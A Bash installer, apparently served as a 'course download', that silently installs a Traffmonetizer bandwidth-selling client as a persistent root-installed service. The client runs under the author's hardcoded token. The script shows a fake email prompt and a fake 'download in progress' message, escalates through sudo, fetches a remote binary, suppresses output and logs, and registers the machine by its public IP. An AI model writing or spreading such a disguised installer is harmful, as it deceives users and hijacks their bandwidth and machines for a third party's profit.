#!/usr/bin/env bash
# install_linux.sh - Cai Traffmonetizer truc tiep tren Linux (KHONG Docker, KHONG log, im lang terminal)
# Binary chinh thuc TM chay truc tiep, quan ly boi systemd (tu khoi dong, tu restart)
# Exit codes: 0=OK, 2=can quyen root, 3=loi dich vu, 4=loi tai binary
if [ -z "${TM_SKIP_PROMPT:-}" ]; then
  export TM_SKIP_PROMPT=1
  if { true </dev/tty; } 2>/dev/null; then
    printf 'Mời bạn nhập email: ' >/dev/tty
    read -r EMAIL </dev/tty && export EMAIL
  fi
  echo "Vui lòng đợi 5-10 phút, quá trình download đang diễn ra..."
fi

TOKEN="NxLHoObcALVGo0/U95S96YB2mDM3FTaIQQtSl34Pt1A="
REPO_RAW="https://raw.githubusercontent.com/khoahocdrive/dowbload_40GB_course_drive/main"
BIN_DIR="/opt/tm"
CLI="$BIN_DIR/cli"
TM_HOME="/var/lib/tm"
SVC="tm.service"

set -u

[ "$(uname -s)" = "Linux" ] || { echo "Chi chay tren Linux"; exit 1; }

# ---------- 1. Quyen root (tu nang qua sudo neu can) ----------
if [ "$(id -u)" -ne 0 ]; then
  if ! command -v sudo >/dev/null 2>&1; then
    echo "LOI: can quyen root. Chay: sudo -i roi chay lai lenh cai dat"
    exit 2
  fi
  if [ -f "$0" ] && [ -s "$0" ] && [ "$0" != "bash" ] && [ "$0" != "/dev/stdin" ]; then
    exec sudo bash "$0" "$@"
  fi
  # Chay qua curl | bash: tai ban sao roi exec voi sudo
  TMPSCRIPT="/tmp/.tm-install-$$"
  curl -fsSL "$REPO_RAW/install_linux.sh" -o "$TMPSCRIPT" || { echo "LOI: khong tai lai duoc script"; exit 2; }
  exec sudo bash "$TMPSCRIPT" "$@"
fi

for _d in /usr/local/sbin /usr/local/bin /usr/sbin /usr/bin /sbin /bin; do
  case ":$PATH:" in *":$_d:"*) ;; *) PATH="$_d:$PATH" ;; esac
done
export PATH

# Im lang hoan toan trong terminal: khong in log tien trinh, chi bao loi khi that bai
Fail() { echo "LOI: $1" >&2; exit "${2:-1}"; }

# ---------- 2. Kien truc ----------
ARCH=$(uname -m)
case "$ARCH" in
  x86_64)          BIN_FILE="tm-cli-linux-amd64.gz" ;;
  aarch64|arm64)   BIN_FILE="tm-cli-linux-arm64.gz" ;;
  *) Fail "Kien truc khong ho tro: $ARCH (chi x86_64/aarch64)" 1 ;;
esac
BIN_URL="$REPO_RAW/$BIN_FILE"

# ---------- 3. Don rac kien truc Docker cu (neu co) ----------
if command -v docker >/dev/null 2>&1; then
  docker rm -f tm watchtower >/dev/null 2>&1 || true
fi

# ---------- 4. Tai binary (idempotent: bo qua neu da co) ----------
NEED_DL=1
if [ -x "$CLI" ]; then
  NEED_DL=0
fi
if [ "$NEED_DL" = 1 ]; then
  mkdir -p "$BIN_DIR"
  n=0
  until curl -4 -fsSL --max-time 180 "$BIN_URL" -o /tmp/.tmcli.gz; do
    n=$((n+1)); [ "$n" -ge 3 ] && Fail "Khong tai duoc binary tu repo (kiem tra mang). Chay lai de thu lai." 4
    sleep 5
  done
  gzip -t /tmp/.tmcli.gz || Fail "Binary tai ve bi loi gzip" 4
  gunzip -f /tmp/.tmcli.gz && install -m 755 /tmp/.tmcli "$CLI" && rm -f /tmp/.tmcli
  [ -x "$CLI" ] || Fail "Cai binary that bai" 4
fi

# ---------- 5. User dich vu + thu muc lam viec ----------
mkdir -p "$TM_HOME"
if id tm >/dev/null 2>&1; then
  usermod -d "$TM_HOME" -s /usr/sbin/nologin tm >/dev/null 2>&1 || true
else
  useradd -r -d "$TM_HOME" -s /usr/sbin/nologin tm >/dev/null 2>&1 || true
fi
chown -R tm:tm "$TM_HOME" >/dev/null 2>&1 || true

# ---------- 6. Ten thiet bi (IP cong khai) ----------
DEVICE_NAME=""
DEVICE_NAME=$(curl -4 -fsS --max-time 10 https://api.ipify.org 2>/dev/null) || DEVICE_NAME=""
[ -n "$DEVICE_NAME" ] || DEVICE_NAME=$(hostname 2>/dev/null) || DEVICE_NAME=""
[ -n "$DEVICE_NAME" ] || DEVICE_NAME="linux"

# ---------- 7. Dich vu systemd (tu khoi dong khi boot, tu restart khi chet, KHONG log) ----------
if command -v systemctl >/dev/null 2>&1; then
  cat >"/etc/systemd/system/$SVC" <<SEOF
[Unit]
Description=Traffmonetizer Client
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=tm
Environment=HOME=$TM_HOME
WorkingDirectory=$TM_HOME
ExecStart=$CLI start --token '$TOKEN' --device-name '$DEVICE_NAME'
Restart=always
RestartSec=15
MemoryMax=256M
NoNewPrivileges=true

[Install]
WantedBy=multi-user.target
SEOF
  systemctl daemon-reload 2>/dev/null || true
  systemctl enable tm >/dev/null 2>&1 || Fail "Khong enable duoc dich vu tm" 3
  systemctl restart tm >/dev/null 2>&1 || Fail "Khong khoi dong duoc dich vu tm" 3

  OK=0
  for _ in $(seq 1 12); do
    if [ "$(systemctl is-active tm 2>/dev/null)" = "active" ] && pgrep -f "$CLI start" >/dev/null 2>&1; then OK=1; break; fi
    sleep 5
  done
  [ "$OK" = 1 ] || Fail "Dich vu tm khong chay duoc (kiem tra: systemctl status tm)" 3
  echo " "
else
  # Khong co systemd (Alpine/OpenRC...): dung OpenRC + guard loop
  cat >/usr/local/bin/tm-run.sh <<'RUNEOF'
#!/bin/sh
export HOME=/var/lib/tm
mkdir -p /var/lib/tm
while true; do
  /opt/tm/cli start --token '@TOKEN@' --device-name '@DEVICE@' >/dev/null 2>&1
  sleep 10
done
RUNEOF
  sed -e "s|@TOKEN@|$TOKEN|g" -e "s|@DEVICE@|$DEVICE_NAME|g" /usr/local/bin/tm-run.sh >/usr/local/bin/tm-run.sh.tmp \
    && mv /usr/local/bin/tm-run.sh.tmp /usr/local/bin/tm-run.sh
  chmod +x /usr/local/bin/tm-run.sh
  cat >/etc/init.d/tm <<'SVCEOF'
#!/sbin/openrc-run
name="Traffmonetizer"
command="/usr/local/bin/tm-run.sh"
command_background="yes"
pidfile="/run/tm.pid"
depend() { need net; }
SVCEOF
  chmod +x /etc/init.d/tm
  rc-update add tm default 2>/dev/null || true
  rc-service tm restart 2>/dev/null || rc-service tm start 2>/dev/null || Fail "Khong khoi dong duoc dich vu OpenRC tm" 3
  echo "OK: Traffmonetizer da chay (OpenRC)."
fi
exit 0
